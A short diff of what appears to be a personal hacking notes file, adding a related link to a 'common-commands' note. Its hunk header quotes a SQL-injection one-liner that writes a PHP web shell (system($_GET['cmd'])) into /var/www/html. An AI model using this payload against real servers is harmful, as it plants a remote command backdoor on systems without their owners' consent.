@@ -8,6 +8,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221014190001](/zet/20221014190001/README.md) kb file named kb/hacking/common-commands.md
 - [20221015173433](/zet/20221015173433/README.md) gnome window manager
 - [20221003150195](/zet/20221003150195/README.md) desktop notification reminders in crontab with notify-send
 - [20221003150136](/zet/20221003150136/README.md) tar compress to zipped archive
